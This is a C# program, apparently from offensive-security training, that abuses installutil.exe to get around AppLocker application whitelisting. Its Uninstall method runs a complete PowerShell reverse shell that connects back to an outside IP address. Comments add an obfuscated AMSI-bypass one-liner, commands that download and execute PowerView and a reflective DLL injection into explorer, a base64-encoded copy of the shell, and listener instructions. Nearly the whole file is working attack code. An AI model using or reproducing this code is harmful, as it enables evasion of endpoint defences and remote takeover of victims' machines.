using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            //Ejecuta con:
            //C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U "C:\Windows\Tasks\applocker3.exe"
            //Para recibir la revshel: nc -lns 444

            //[ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))
            //(New-Object System.Net.WebClient).DownloadString('http://192.168.49.179/PowerView.ps1') | IEX

            //String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.179/met.dll'); (New-Object System.Net.WebClient).DownloadString('http://192.168.49.179/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";



            
            string cmd = @"$client = New-Object System.Net.Sockets.TCPClient('192.168.49.58',4444);
                                    $stream = $client.GetStream();
                                    [byte[]]$bytes = 0..65535|%{0};
                                    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
                                    {
	                                    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
	                                    try
	                                    {	
		                                    $sendback = (iex $data 2>&1 | Out-String );
		                                    $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
	                                    }
	                                    catch
	                                    {
		                                    $error[0].ToString() + $error[0].InvocationInfo.PositionMessage;
		                                    #$sendback2  =  ""ERROR: "" + $error[0].ToString() + ""'n'n"" + ""PS "" + (pwd).Path + '> ';
                                            $sendback2  =  ""ERROR: ""+$error[0].ToString()+""`n`n"" + ""PS "" + (pwd).Path + '> ';

                                        }	
	                                    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	                                    $stream.Write($sendbyte,0,$sendbyte.Length);
	                                    $stream.Flush();
                                    };
                                    $client.Close();";

            /*
            string base64Encoded = System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(cmd));
            string base64Encoded = "JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTkyLjE2OC40OS41OCcsNDQ0NCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3RyZWFtID0gJGNsaWVudC5HZXRTdHJlYW0oKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCgkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTsNCgkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkNCgkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CQ0KCQkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7DQoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzZW5kYmFjazIgID0gJHNlbmRiYWNrICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJzsNCgkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2gNCgkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRlcnJvclswXS5Ub1N0cmluZygpICsgJGVycm9yWzBdLkludm9jYXRpb25JbmZvLlBvc2l0aW9uTWVzc2FnZTsNCgkJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyRzZW5kYmFjazIgID0gICJFUlJPUjogIiArICRlcnJvclswXS5Ub1N0cmluZygpICsgIiduJ24iICsgIlBTICIgKyAocHdkKS5QYXRoICsgJz4gJzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNlbmRiYWNrMiAgPSAgIkVSUk9SOiAiKyRlcnJvclswXS5Ub1N0cmluZygpKyJgbmBuIiArICJQUyAiICsgKHB3ZCkuUGF0aCArICc+ICc7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CQ0KCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJhY2syKTsNCgkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOw0KCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzdHJlYW0uRmx1c2goKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY2xpZW50LkNsb3NlKCk7";
            string cmd = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(base64Encoded));
            //Console.WriteLine("string cmd = " + cmd);
            //Console.WriteLine("string base64Encoded = " + base64Encoded);
            */

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}